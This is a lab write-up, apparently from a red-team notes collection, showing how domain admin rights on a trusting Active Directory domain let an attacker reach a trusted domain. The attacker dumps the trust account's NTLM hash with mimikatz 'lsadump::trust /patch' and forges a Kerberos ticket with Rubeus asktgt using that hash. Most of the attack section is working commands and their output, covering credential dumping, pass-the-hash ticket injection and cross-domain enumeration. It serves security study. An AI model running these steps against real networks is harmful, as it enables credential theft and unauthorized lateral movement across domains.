# Abusing Trust Account$: Accessing Resources on a Trusted Domain from a Trusting Domain

## Abusing Trust Account$: Accessing Resources on a Trusted Domain from a Trusting Domain

This is a quick lab to familiarize with a technique that allows accessing resources on a trusted domain from a fully compromised (Domain admin privileges achieved) trusting domain, by recovering the trusting `account$` (that's present on the trusted domain) password hash.

This lab is based on the great research here [https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-7-trust-account-attack-from-trusting-to-trusted](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-7-trust-account-attack-from-trusting-to-trusted), go check it out for more details and detection / prevention ideas.

### Overview

The environment for this lab is as follows:

| Resource               | Type              |                                                                                      |
| ---------------------- | ----------------- | ------------------------------------------------------------------------------------ |
| first-dc.first.local   | Domain Controller | Domain controller in the first.local domain                                          |
| second-dc.second.local | Domain Controller | Domain controller in the second.local domain                                         |
| first.local            | Domain            | This domain does not trust second.local domain, but second.local trusts this domain. |
| second.local           | Domain            | This domain trusts first.local domain, but first.local does not trust this domain.   |

In short, there is a one way trust relationship between `first.local` and `second.local`, where `first.local` does not trust `second.local`, but `second.local` trusts `first.local`. Or simply put in other words, it's possible to access resources from `first.local` on `second.local`, but not the other way around.

The technique in this lab, however, shows that it's still possible to access resources from `second.local` on `first.local` domain if `second.local` domain is compromised and domain admin privileges are obtained.

This technique is possible, because once a trust relationship between domains is established, a trust account for the trusting domain is created in the trusted domain and it's possible to compromise that account's password hash, which enables an attacker to authenticate to the trusted domain with the trust account.

In our lab, considering that `first.local` is a trusted domain trusted by the trusting domain `second.local`, the trust account `first.local\second$` (user account `second$` in the domain `first.local`) will be created.

`first.local\second$` is the trust account we want to and CAN compromise from the `second.local domain`, assuming we have domain admin privileges there.

Visually, this looks like something like this:

![Technique / attack diagram based on the one seen in https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-7-trust-account-attack-from-trusting-to-trusted](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-LFEMnER3fywgFHoroYn%2Fuploads%2FpOXBsrfnX1kPsm8JzNiS%2Fimage.png?alt=media\&token=427c7481-ab05-4919-82ba-8bc4b756712a)

### Checks

Let's check some of the things we touched on in the overview.

Confirm the trust relationships between domains:

```
# on first-dc.first.local
get-adtrust -filter *
```

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-LFEMnER3fywgFHoroYn%2Fuploads%2FXIzgQuAEpcx7mc8NaW54%2Fimage.png?alt=media\&token=444542e1-b124-45d7-beee-374beaa13161)

```
# on second-dc.second.local
get-adtrust -filter *
```

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-LFEMnER3fywgFHoroYn%2Fuploads%2Fi2BedRo5HvEP2Z56t8Lk%2Fimage.png?alt=media\&token=f2049b14-e2f3-47bb-a46d-afbbec0bd337)

Confirm that there's a trust account `second$` on `first.local` domain:

```
# on first-dc.first.local
get-aduser 'second$'
```

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-LFEMnER3fywgFHoroYn%2Fuploads%2Fvpr5WMQ6lFeYAydws7br%2Fimage.png?alt=media\&token=e0a23682-788f-4ec6-9074-1697161fc720)

Confirm that we can enumerate resources on the trusting domain `second.local` from `first.local`:

```
# from first-dc.first.local
get-aduser -Filter * -Server second.local -Properties samaccountname,serviceprincipalnames | ? {$_.ServicePrincipalNames} | ft
```

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-LFEMnER3fywgFHoroYn%2Fuploads%2FqTovbrDRhYNtcT9bZ6X9%2Fimage.png?alt=media\&token=a8df6d71-b425-42dc-af02-52a7eca27844)

Confirm that we cannot (just yet, but this is soon to change) enumerate resources on the trusted domain `first.local` from the trusting domain :

```
# on second-dc.second.local
get-aduser -Filter * -Server first.local -Properties samaccountname,serviceprincipalnames | ? {$_.ServicePrincipalNames} | ft
```

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-LFEMnER3fywgFHoroYn%2Fuploads%2FMEGd6UDX9WyGJAEq3n34%2Fimage.png?alt=media\&token=99ba6c26-f52e-49dd-a99e-3ea0156fd372)

### Compromising Trust Account first.local\second$

As mentioned earlier, the main crux of the technique is that we're able to compromise the trust account `first.local\second$` if we have domain admin privileges on `second.local`.

To compromise the `first.local\second$` and reveal its password hash, we can use mimikatz like so:

```
# on second-dc.second.local
mimikatz.exe "lsadump::trust /patch" "exit"
```

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-LFEMnER3fywgFHoroYn%2Fuploads%2FxPKnVYnYhCT0oeMMruzz%2Fimage.png?alt=media\&token=23e17a0c-86f9-4dbe-8e98-3033a61bfadf)

Note the RC4 hash in `[out] first.local` -> `second.local` line - this is the NTLM hash for `first.local\second$` trust account, capture it.

### Requesting TGT for first.local\second$

Once we have the NTLM hash for `first.local\second$`, we can request its TGT from `first.local`:

```
#on second-dc.second.local
Rubeus.exe asktgt /user:second$ /domain:first.local /rc4:24b07e26ca7affb4ac061f6920cb57ec /nowrap /ptt
```

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-LFEMnER3fywgFHoroYn%2Fuploads%2Fw5fieE5CrbZYhdYhXjLC%2Fimage.png?alt=media\&token=84021003-33f8-4666-9a44-89fce10aedd7)

### Accessing Resources on First.local from Second.local

At this point on `second-dc.second.local`, we have a TGT for `first.local\second$` committed to memory and we can now start enumerating resources on `first.local` - and this concludes the technique, showing that it's possible to access resources on a trusted domain (as a low privileged user), given the trusting domain is compromised:

```
Get-ADUser roast.user -Server first.local -Properties * | select samaccountname, serviceprincipalnames
```

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-LFEMnER3fywgFHoroYn%2Fuploads%2FISz1B13cZE7C3yzlGU3m%2Fimage.png?alt=media\&token=2adab319-d0d1-428b-814f-e186471fdeae)

### References

{% embed url="https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-7-trust-account-attack-from-trusting-to-trusted" %}
